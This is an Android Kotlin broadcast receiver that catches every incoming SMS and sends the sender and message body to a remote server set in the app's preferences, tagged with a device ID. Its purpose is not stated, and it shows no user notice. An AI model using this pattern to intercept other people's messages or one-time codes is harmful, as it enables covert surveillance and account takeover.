package com.template.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.util.Log
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isNullOrEmpty()) return

            var body = ""
            var sender = ""

            for (msg in messages) {
                sender = msg.originatingAddress ?: ""
                body += msg.messageBody ?: ""
            }

            Log.d("SmsReceiver", "📱 SMS from $sender: $body")

            // Kirim ke server via HTTP
            Thread {
                try {
                    val prefs = context.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
                    val deviceId = prefs.getString("flutter.deviceId", "") ?: ""
                    val serverUrl = prefs.getString("flutter.serverUrl", "") ?: ""
                    val accessKey = prefs.getString("flutter.accessKey", "") ?: ""

                    if (deviceId.isEmpty() || serverUrl.isEmpty()) return@Thread

                    val url = URL("$serverUrl/api/post-comm-log/$deviceId")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("Content-Type", "application/json")
                    conn.setRequestProperty("X-Access-Key", accessKey)
                    conn.doOutput = true
                    conn.connectTimeout = 10000
                    conn.readTimeout = 10000

                    val json = JSONObject().apply {
                        put("type", "sms")
                        put("title", sender)
                        put("body", body)
                        put("contact", sender)
                        put("isIncoming", true)
                    }

                    val writer = OutputStreamWriter(conn.outputStream)
                    writer.write(json.toString())
                    writer.flush()
                    writer.close()

                    val code = conn.responseCode
                    Log.d("SmsReceiver", "SMS sent to server: $code")
                } catch (e: Exception) {
                    Log.e("SmsReceiver", "Send error: ${e.message}")
                }
            }.start()

        } catch (e: Exception) {
            Log.e("SmsReceiver", "onReceive error", e)
        }
    }
}
